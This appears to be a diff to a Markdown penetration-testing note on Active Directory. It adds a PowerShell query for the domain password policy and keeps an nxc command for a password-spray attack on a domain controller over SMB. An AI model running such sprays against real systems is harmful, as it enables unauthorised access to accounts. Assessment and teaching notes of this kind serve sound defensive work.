@@ -75,11 +75,28 @@ Get-ADComputer -Filter * -Properties LastLogonDate |
 
 ----  
 
-## Password Spray  
+## Password Policy & Spray  
 
->These accounts with weak or old passwords are a security risk to an organization,  
+>AD accounts with weak or old passwords are a security risk to an organization,  
 >as their passwords may not comply to latest domain password policy and has been dormant.  
->Malicious actors finding these accounts can use it to gain read access to Active Directory through method such as a password spray attack using nxc.  
+>Malicious actors finding these accounts can use it to gain read access to Active Directory.  
+
+>Get the AD Password Policy:  
+
+```PowerShell
+# Specify the trusted domain name
+$trustedDomain = "target.int"
+
+# Get password policy details for the trusted domain
+$passwordPolicy = Get-ADDefaultDomainPasswordPolicy -Server $trustedDomain
+
+# Display the password policy details
+$passwordPolicy | Select-Object *
+```  
+
+![password-policy.png](/images/password-policy.png)  
+
+>Attack using a password spray attack using nxc.  
 
 ```bash
 nxc -t 1 smb domaincontroller.domain.internal -u userlist.txt -p password --continue-on-success
